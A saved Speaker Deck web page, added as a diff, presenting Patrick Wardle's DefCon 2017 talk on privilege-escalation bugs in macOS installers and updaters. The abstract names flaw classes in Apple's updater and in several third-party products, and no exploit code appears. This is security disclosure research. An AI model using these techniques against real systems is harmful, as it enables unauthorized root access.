@@ -1,0 +1,2038 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! - Speaker Deck</title>
+    <link rel="stylesheet" media="screen" href="https://d1eu30co0ohy4w.cloudfront.net/assets/application-cba30e7a2c4a3775839f3ae72af66c60a4f4c3dbf3ed63d2823cc1aeff683af8.css" />
+<script src="https://d1eu30co0ohy4w.cloudfront.net/assets/application-2ef0300d6a5359a4b84c.js"></script>
+
+<link rel="icon" type="image/png" href="https://d1eu30co0ohy4w.cloudfront.net/assets/favicon-c0fe5475f88a65b817c8cc7c0fedc01b7acc17fe27628fa13ca3f96e56e16977.png" />
+<link rel="apple-touch-icon" type="image/png" href="https://d1eu30co0ohy4w.cloudfront.net/assets/favicon-c0fe5475f88a65b817c8cc7c0fedc01b7acc17fe27628fa13ca3f96e56e16977.png" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, viewport-fit=cover">
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="BHi1RJgqdhAKqyzYNzhOLmj2WZQsKfCuKh8rJgiXSsUGpx6QuIrua2M8/vKTgGp9WwyV/0sJgbO1osmwr9nbkQ==" />
+
+
+      <link rel="alternate" type="application/json+oembed" href="https://speakerdeck.com/oembed.json?url=https%3A%2F%2Fspeakerdeck.com%2Fpatrickwardle%2Fdefcon-2017-death-by-1000-installers-its-all-broken" title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken!" />
+
+  <meta property="og:url" content="https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8" />
+  <meta property="og:site_name" content="Speaker Deck" />
+  <meta property="og:title" content="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken!" />
+  <meta property="og:description" content="Ever get an uneasy feeling when an installer asks for your password? Well, your gut was right! The majority of macOS installers &amp; updaters are vulnerable to a wide range of priv-esc attacks.
+
+It began with the discovery that Apple&#39;s OS updater could be abused to bypass SIP (CVE-2017-6974). Next, turns out Apple&#39;s core installer app may be subverted to load unsigned dylibs which may elevate privileges to root.
+
+And what about 3rd-party installers? I looked at what&#39;s installed on my Mac, and ahhh, so many bugs! 
+
+Firewall, Little Snitch: EoP via race condition of insecure plist
+Anti-Virus, Sophos: EoP via hijack of binary component 
+Browser, Google Chrome: EoP via script hijack
+Virtualization, VMWare Fusion: EoP via race condition of insecure script
+IoT, DropCam: EoP via hijack of binary component
+and more!
+
+...and 3rd-party auto-update frameworks like Sparkle -yup vulnerable too!
+
+Though root is great, we can&#39;t bypass SIP nor load unsigned kexts. However with root, I discovered one could now trigger a ring-0 heap-overflow that provides complete system control.
+
+Though the talk will discuss a variety of discovery mechanisms, 0days, and macOS exploitation techniques, it won&#39;t be all doom &amp; gloom. We&#39;ll end by discussing ways to perform authorized installs/upgrades that don&#39;t undermine system security." />
+  <meta property="og:type" content="website" />
+  <meta property="og:author" content="https://www.facebook.com/SpeakerDeck" />
+  <meta property="og:image" content="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_0.jpg?8368100" />
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@speakerdeck">
+  <meta name="twitter:creator" content="@speakerdeck">
+  <meta name="twitter:title" content="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken!">
+  <meta name="twitter:description" content="Ever get an uneasy feeling when an installer asks for your password? Well, your gut was right! The majority of macOS installers &amp; updaters are vulnerable to a wide range of priv-esc attacks.
+
+It began with the discovery that Apple&#39;s OS updater could be abused to bypass SIP (CVE-2017-6974). Next, turns out Apple&#39;s core installer app may be subverted to load unsigned dylibs which may elevate privileges to root.
+
+And what about 3rd-party installers? I looked at what&#39;s installed on my Mac, and ahhh, so many bugs! 
+
+Firewall, Little Snitch: EoP via race condition of insecure plist
+Anti-Virus, Sophos: EoP via hijack of binary component 
+Browser, Google Chrome: EoP via script hijack
+Virtualization, VMWare Fusion: EoP via race condition of insecure script
+IoT, DropCam: EoP via hijack of binary component
+and more!
+
+...and 3rd-party auto-update frameworks like Sparkle -yup vulnerable too!
+
+Though root is great, we can&#39;t bypass SIP nor load unsigned kexts. However with root, I discovered one could now trigger a ring-0 heap-overflow that provides complete system control.
+
+Though the talk will discuss a variety of discovery mechanisms, 0days, and macOS exploitation techniques, it won&#39;t be all doom &amp; gloom. We&#39;ll end by discussing ways to perform authorized installs/upgrades that don&#39;t undermine system security.">
+  <meta name="twitter:image:src" content="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_0.jpg?8368100">
+  <link rel="canonical" href="https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken" />
+
+  <meta name="stats-owner_id" content="184048" />
+  <meta name="stats-talk_id" content="401688" />
+  <meta name="stats-view_type" content="talk" />
+
+    
+  </head>
+  <body class="sd-app">
+    
+      <div class="alert alert-banner">
+            <a class="d-block text-center text-white" href="/pro">
+      <span class="text-warning">Upgrade to Pro</span> &mdash; share decks privately, control downloads, hide ads and more &hellip;
+</a>
+      </div>
+    <div class="sd-menu d-md-none">
+  <div class="container sd-menu-fixed-container">
+    <div class="sd-brand">
+      <a class="sd-brand-logo" href="/">
+        <img alt="Speaker Deck" src="https://d1eu30co0ohy4w.cloudfront.net/assets/mark-f4be6df1e05965cac9f98e664a6c35f5ffdd0207385d07464a9214d6cdf76082.svg" /> <span class="d-none d-md-inline">Speaker Deck</span>
+</a>    </div>
+
+      <nav class="sd-fixed-nav">
+        <div class="sd-nav-main js-toggle-container">
+          <ul class="sd-nav-fixed-group nav toggle-flex-when-off">
+            <li class="sd-nav-item d-md-block d-none">
+              <form action="https://www.google.com/cse" id="cse-search-box" class="form-inline ml-5 ml-md-3">
+                <input type="hidden" name="cx" value="010150859881542981030:hqhxyxpwtc4">
+                <input type="hidden" name="ie" value="UTF-8">
+                <input type="text" name="q" id="q" value="" placeholder="Search..." class="form-control search-input mr-2">
+                <input type="submit" name="sa" value="Search" class="btn btn-outline-primary d-inline-block d-md-none d-lg-inline-block">
+              </form>
+            </li>
+            <li class="sd-nav-item nav-item">
+                <a class="sd-nav-link nav-link" href="/pro">
+                  Speaker Deck <div class="badge badge-pro-prominent">PRO</div>
+</a>            </li>
+            <li class="sd-nav-item nav-item">
+              <a class="sd-nav-link nav-link" href="/signin">
+                Sign in
+</a>            </li>
+            <li class="sd-nav-item nav-item">
+              <a class="btn btn-primary" href="/signup">
+                Sign up <span class="d-none d-md-inline">for free</span>
+</a>            </li>
+            <li class="sd-nav-item d-block d-md-none">
+              <button class="btn btn-link mr-2 js-toggle-trigger">
+                <svg class="icon icon-search "><use xlink:href="/icons/icons.svg#icon-search"></use></svg>
+              </button>
+            </li>
+          </ul>
+          <ul class="sd-nav-fixed-group nav toggle-flex-when-on">
+            <li class="sd-nav-item">
+              <form action="https://www.google.com/cse" id="cse-search-box" class="form-inline ml-5 ml-md-3">
+                <input type="hidden" name="cx" value="010150859881542981030:hqhxyxpwtc4">
+                <input type="hidden" name="ie" value="UTF-8">
+                <div class="row">
+                  <div class="col col-auto pr-0">
+                    <input type="text" name="q" id="q" value="" placeholder="Search..." class="form-control search-input mr-2">
+                  </div>
+                  <div class="col col-auto">
+                    <input type="submit" name="sa" value="Search" class="btn btn-outline-primary d-inline-block d-md-none d-lg-inline-block">
+                  </div>
+                </div>
+              </form>
+            </li>
+            <li class="sd-nav-item pr-2">
+              <button class="btn btn-link js-toggle-trigger">
+                <svg class="icon icon-x "><use xlink:href="/icons/icons.svg#icon-x"></use></svg>
+              </button>
+            </li>
+          </ul>
+        </div>
+      </nav>
+  </div>
+</div>
+
+    
+    
+    <div class="sd-main">
+      
+
+
+
+<div class="deck deck-with-banner">
+  <div class="deck-background" style="background-image: url('https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/preview_slide_0.jpg?8368100')"></div>
+  
+  <div class="deck-header d-none d-md-block js-toggle-container">
+    <div class="container d-flex align-items-center w-100">
+      <div class="deck-header-logo py-3 flex-grow-0">
+        <a class="sd-brand-logo" href="/">
+          <img alt="Speaker Deck" src="https://d1eu30co0ohy4w.cloudfront.net/assets/mark-white-8d908558fe78e8efc8118c6fe9b9b1a9846b182c503bdc6902f97df4ddc9f3af.svg" />
+</a>      </div>
+      <h4 class="deck-header-title flex-grow-1 flex-shrink-0 w-100 d-none mx-3 d-md-block p-3 text-center m-0 text-white text-truncate toggle-block-when-off">
+
+
+
+
+        [DefCon 2017] Death by 1000 Installers; it&#39;s All Broken!
+      </h4>
+      <div class="deck-header-user-nav toggle-block-when-on ml-auto">
+        <form action="https://www.google.com/cse" id="cse-search-box" class="form-inline ml-5 ml-md-3">
+          <input type="hidden" name="cx" value="010150859881542981030:hqhxyxpwtc4">
+          <input type="hidden" name="ie" value="UTF-8">
+          <input type="text" name="q" id="q" value="" placeholder="Search..." class="form-control form-control-inverse search-input mr-2">
+          <input type="submit" name="sa" value="Search" class="btn btn-success d-inline-block d-md-none d-lg-inline-block">
+        </form>
+      </div>
+      <div class="deck-header-user-nav toggle-block-when-on">
+        <button class="btn btn-link mr-2 js-toggle-trigger">
+          <svg class="icon icon-x "><use xlink:href="/icons/icons.svg#icon-x"></use></svg>
+        </button>
+      </div>
+      <div class="deck-header-user-nav toggle-block-when-off">
+        <button class="btn btn-link mr-2 js-toggle-trigger">
+          <svg class="icon icon-search "><use xlink:href="/icons/icons.svg#icon-search"></use></svg>
+        </button>
+      </div>
+      <div class="deck-header-user-nav flex-grow-0 dropdown py-3">
+        
+      </div>
+    </div>
+  </div>
+
+  
+<div class="deck-embed js-deck-embed" data-ratio="1.77777777777778" data-state="processed">
+    <div class="speakerdeck-embed" data-slide="8" data-title="false" data-skip-resize="true" data-id="6bd02a9ee4e744908e24c72945ac3bba" data-ratio="1.77777777777778" data-host="speakerdeck.com"></div>
+</div>
+
+
+  <div class="deck-meta">
+    <div class="container">
+      <div class="row align-items-center justify-content-between">
+        <div class="col-md-auto col-12 py-3">
+          <div class="row align-items-center justify-content-between justify-content-md-start">
+            <a class="d-flex align-items-center font-weight-bold text-white col-auto" href="/patrickwardle">
+              <span class="mr-2">
+                <img class="avatar" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=47" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=47" />
+              </span>
+              <span>
+                patrick wardle
+                
+              </span>
+</a>            <div class="col-auto text-muted">
+              July 28, 2017
+            </div>
+            <div class="col-auto d-none d-md-block">
+              
+            </div>
+          </div>
+        </div>
+        <div class="col-md-auto col-12 py-md-3 pb-3">
+          <div class="row justify-content-between justify-content-md-start">
+              <div class="col-auto mr-auto mr-md-0">
+                <a class="text-white font-weight-bold" href="/c/technology">
+                  <svg class="icon icon-folder "><use xlink:href="/icons/icons.svg#icon-folder"></use></svg> Technology
+</a>              </div>
+            <div class="col-auto">
+              <div class="js-stargazer animated">
+      <a class="text-white font-weight-bold" title="Star this deck" href="/signin?return_to=%2Fpatrickwardle%2Fdefcon-2017-death-by-1000-installers-its-all-broken">
+        <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 2
+</a></div>
+
+            </div>
+            <div class="col-auto text-white font-weight-bold">
+              <span title="4,966 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 5k</span>
+            </div>
+              <div class="col-auto text-white font-weight-bold">
+                <a title="Download PDF" href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/DefCon_2017.pdf"><svg class="icon icon-download "><use xlink:href="/icons/icons.svg#icon-download"></use></svg></a>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<style media="screen">
+.native-js  {
+  position: relative;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+}
+
+.native-js .native-banner {
+  display: flex;
+  padding: 20px 20px;
+  text-decoration: none;
+
+  flex-flow: row nowrap;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.native-js .native-banner .native-img {
+  margin-right: 20px;
+  max-height: 50px;
+  line-height: 0;
+}
+
+.native-js .native-banner .native-main {
+  display: flex;
+  max-width: 1024px;
+  margin: 0 auto;
+
+  flex-grow: 1;
+  flex-flow: row nowrap;
+  align-items: center;
+}
+
+.native-js .native-banner .native-details {
+  display: flex;
+  margin-right: 20px;
+
+  flex-flow: column nowrap;
+}
+
+.native-js .native-banner .native-company {
+  margin-bottom: 4px;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  font-size: 10px;
+  line-height: 1;
+}
+
+.native-js .native-banner .native-desc {
+  letter-spacing: 1px;
+  font-weight: 300;
+  line-height: 1.4;
+}
+
+.native-js .native-banner .native-cta {
+  padding: 10px 16px;
+  border-radius: 3px;
+  box-shadow: 0 6px 13px 0 hsla(0, 0%, 0%, .15);
+  text-transform: uppercase;
+  white-space: nowrap;
+  letter-spacing: 1px;
+  line-height: 1;
+  font-weight: 400;
+  font-size: 12px;
+  transition: all .3s ease-in-out;
+  transform: translateY(-1px);
+}
+
+.native-js .native-banner .native-cta:hover {
+  box-shadow: none;
+  transform: translateY(1px);
+}
+
+.native-js .native-source {
+  position: absolute;
+  right: 0;
+  bottom: 0;
+  padding: 5px;
+  border-top: 0;
+  border-top-left-radius: 3px;
+  background: repeating-linear-gradient(-45deg, transparent, transparent 5px, hsla(0, 0%, 0%, .025) 5px, hsla(0, 0%, 0%, .025) 10px) hsla(203, 11%, 95%, .4);
+  color: #111;
+  text-decoration: none;
+  text-transform: uppercase;
+  letter-spacing: .5px;
+  font-weight: 600;
+  font-size: 7px;
+}
+
+
+@media only screen and (min-width: 320px) and (max-width: 759px) {
+  .native-js .native-banner,
+  .native-js .native-banner .native-main {
+    flex-flow: column nowrap;
+  }
+
+  .native-js .native-banner .native-img,
+  .native-js .native-banner .native-details {
+    margin: 0;
+  }
+
+  .native-js .native-banner .native-img {
+    display: none;
+  }
+
+  .native-js .native-banner .native-company {
+    letter-spacing: 1px;
+  }
+
+  .native-js .native-banner .native-details {
+    text-align:  left;
+    font-size: 14px;
+  }
+
+  .native-js .native-banner .native-cta {
+    display: none;
+  }
+}
+</style>
+<script src="//m.servedby-buysellads.com/monetization.js" type="text/javascript"></script>
+<div class="native-js"></div>
+<script>
+(function(){
+  if(typeof _bsa !== 'undefined' && _bsa) {
+      _bsa.init('custom', 'CK7I4K3Y', 'placement:speakerdeckcom',
+        {
+          target: '.native-js',
+          template: `
+<a href="##link##" class="native-banner" style="background: linear-gradient(-30deg, ##backgroundColor##E5, ##backgroundColor##E5 45%, ##backgroundColor## 45%) #fff;">
+    <div class="native-main">
+      <img class="native-img" img src="##logo##">
+      <div class="native-details" style="color: ##textColor##">
+        <span class="native-company">Sponsored by ##company##</span>
+        <span class="native-desc">##description##</span>
+      </div>
+      <span class="native-cta" style="color: ##ctaTextColor##; background-color: ##ctaBackgroundColor##;">##callToAction##</span>
+    </div>
+  </a>
+`,
+        }
+      );
+    }
+})();
+</script>
+
+<div class="container container-lg py-md-5 py-3">
+  <h1 class="mb-4">[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken!</h1>
+    <div class="deck-description mb-4">
+      <p>Ever get an uneasy feeling when an installer asks for your password? Well, your gut was right! The majority of macOS installers &amp; updaters are vulnerable to a wide range of priv-esc attacks.</p>
+
+<p>It began with the discovery that Apple's OS updater could be abused to bypass SIP (CVE-2017-6974). Next, turns out Apple's core installer app may be subverted to load unsigned dylibs which may elevate privileges to root.</p>
+
+<p>And what about 3rd-party installers? I looked at what's installed on my Mac, and ahhh, so many bugs! </p>
+
+<p>Firewall, Little Snitch: EoP via race condition of insecure plist
+<br>Anti-Virus, Sophos: EoP via hijack of binary component 
+<br>Browser, Google Chrome: EoP via script hijack
+<br>Virtualization, VMWare Fusion: EoP via race condition of insecure script
+<br>IoT, DropCam: EoP via hijack of binary component
+<br>and more!</p>
+
+<p>...and 3rd-party auto-update frameworks like Sparkle -yup vulnerable too!</p>
+
+<p>Though root is great, we can't bypass SIP nor load unsigned kexts. However with root, I discovered one could now trigger a ring-0 heap-overflow that provides complete system control.</p>
+
+<p>Though the talk will discuss a variety of discovery mechanisms, 0days, and macOS exploitation techniques, it won't be all doom &amp; gloom. We'll end by discussing ways to perform authorized installs/upgrades that don't undermine system security.</p>
+    </div>
+  <div class="row align-items-center mb-4">
+    <div class="col-md-auto col-12 mr-md-auto mb-4 mb-md-0">
+      <div class="row align-items-center">
+        <div class="col-auto">
+          <a href="/patrickwardle"><img class="avatar avatar-large" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=128" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=128" /></a>
+        </div>
+        <div class="col-auto pl-0">
+          <h4 class="m-0">
+            <a class="text-dark" href="/patrickwardle">patrick wardle</a>
+            
+          </h4>
+          <div class="text-muted">
+              July 28, 2017
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="col-md-auto col-12">
+      <div class="btn-group btn-group-flex d-flex" role="group">
+        
+        <a href="https://twitter.com/intent/tweet?url=https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8&text=%5BDefCon+2017%5D+Death+by+1000+Installers%3B+it%27s+All+Broken%21" class="btn btn-outline-primary w-100">
+          <svg class="icon icon-twitter "><use xlink:href="/icons/icons.svg#icon-twitter"></use></svg> Tweet
+        </a>
+        <button class="facebook-share btn btn-outline-primary w-100">
+          <svg class="icon icon-facebook "><use xlink:href="/icons/icons.svg#icon-facebook"></use></svg> Share
+        </button>
+      </div>
+    </div>
+  </div>
+
+  
+        <div class="carbon-container">
+          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7D553I&placement=speakerdeckcom" id="_carbonads_js"></script>
+        </div>
+      
+</div>
+
+<div class="bg-lightest border-top">
+  <div class="container py-md-4 py-3">
+      <div class="row mb-4 align-items-center">
+        <div class="col-12 col-lg-9 mb-3 mb-lg-0">
+          <h2 class="m-0">More Decks by patrick wardle</h2>
+        </div>
+        <div class="col-12 col-lg-3 text-lg-right">
+          <a class="btn btn-outline-primary" href="/patrickwardle">
+            See All by patrick wardle  <svg class="icon icon-chevron-right "><use xlink:href="/icons/icons.svg#icon-chevron-right"></use></svg>
+</a>        </div>
+      </div>
+      <div class="row">
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/patrickwardle/office-drama-on-macos" title="Office Drama on macOS">
+      <div class="card deck-preview" data-id="f2c905ad536048828508f1a70a7de5dd" data-slide-count="42" data-cover-image="https://files.speakerdeck.com/presentations/f2c905ad536048828508f1a70a7de5dd/preview_slide_0.jpg?16005953">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/f2c905ad536048828508f1a70a7de5dd/preview_slide_0.jpg?16005953');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/f2c905ad536048828508f1a70a7de5dd/preview_slide_0.jpg?16005953');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=48" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=48" />
+              patrickwardle
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="302 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 300</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/patrickwardle/repurposed-malware-a-dark-side-of-recycling" title="Repurposed Malware: A Dark Side of Recycling">
+      <div class="card deck-preview" data-id="faad41306f8c46f981b6e30fbfbc121e" data-slide-count="67" data-cover-image="https://files.speakerdeck.com/presentations/faad41306f8c46f981b6e30fbfbc121e/preview_slide_0.jpg?15030908">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/faad41306f8c46f981b6e30fbfbc121e/preview_slide_0.jpg?15030908');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/faad41306f8c46f981b6e30fbfbc121e/preview_slide_0.jpg?15030908');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=48" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=48" />
+              patrickwardle
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 1
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="619 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 620</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/patrickwardle/cyber-espionage-in-the-middle-east-unravelling-osx-dot-windtail" title="Cyber-Espionage in the Middle East: Unravelling OSX.WindTail">
+      <div class="card deck-preview" data-id="6526185ac6d6458780453dc788ca411a" data-slide-count="38" data-cover-image="https://files.speakerdeck.com/presentations/6526185ac6d6458780453dc788ca411a/preview_slide_0.jpg?13785718">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/6526185ac6d6458780453dc788ca411a/preview_slide_0.jpg?13785718');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/6526185ac6d6458780453dc788ca411a/preview_slide_0.jpg?13785718');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=48" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=48" />
+              patrickwardle
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 2
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="1,146 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 1.1k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/patrickwardle/harnessing-weapons-of-mac-destruction" title="Harnessing Weapons of Mac Destruction">
+      <div class="card deck-preview" data-id="3fe719d1c69a429c8f78230be62e1f70" data-slide-count="68" data-cover-image="https://files.speakerdeck.com/presentations/3fe719d1c69a429c8f78230be62e1f70/preview_slide_0.jpg?13306632">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/3fe719d1c69a429c8f78230be62e1f70/preview_slide_0.jpg?13306632');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/3fe719d1c69a429c8f78230be62e1f70/preview_slide_0.jpg?13306632');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=48" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=48" />
+              patrickwardle
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 3
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="1,921 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 1.9k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/patrickwardle/leveraging-apples-game-engine-to-detect-threats" title="Leveraging Apple’s Game Engine to Detect Threats">
+      <div class="card deck-preview" data-id="36fb493c0efa433fadb2644a4ed23197" data-slide-count="59" data-cover-image="https://files.speakerdeck.com/presentations/36fb493c0efa433fadb2644a4ed23197/preview_slide_0.jpg?12057673">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/36fb493c0efa433fadb2644a4ed23197/preview_slide_0.jpg?12057673');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/36fb493c0efa433fadb2644a4ed23197/preview_slide_0.jpg?12057673');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=48" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=48" />
+              patrickwardle
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 3
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="1,059 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 1.1k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/patrickwardle/fire-and-ice-making-and-breaking-macos-firewalls-extended" title="Fire &amp; Ice: Making and Breaking macOS Firewalls [Extended]">
+      <div class="card deck-preview" data-id="4a8c797d5e78478c90ecaabfa01b382f" data-slide-count="50" data-cover-image="https://files.speakerdeck.com/presentations/4a8c797d5e78478c90ecaabfa01b382f/preview_slide_0.jpg?10873250">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4a8c797d5e78478c90ecaabfa01b382f/preview_slide_0.jpg?10873250');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4a8c797d5e78478c90ecaabfa01b382f/preview_slide_0.jpg?10873250');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=48" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=48" />
+              patrickwardle
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 3
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="1,177 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 1.2k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/patrickwardle/the-mouse-is-mightier-than-the-sword" title="The Mouse is Mightier than the Sword">
+      <div class="card deck-preview" data-id="9357912b4d3b4c9e9d5ad3e2a5b37b15" data-slide-count="66" data-cover-image="https://files.speakerdeck.com/presentations/9357912b4d3b4c9e9d5ad3e2a5b37b15/preview_slide_0.jpg?10563003">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/9357912b4d3b4c9e9d5ad3e2a5b37b15/preview_slide_0.jpg?10563003');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/9357912b4d3b4c9e9d5ad3e2a5b37b15/preview_slide_0.jpg?10563003');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=48" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=48" />
+              patrickwardle
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 4
+            </div>
+            <div class="px-2 ml-auto py-3">
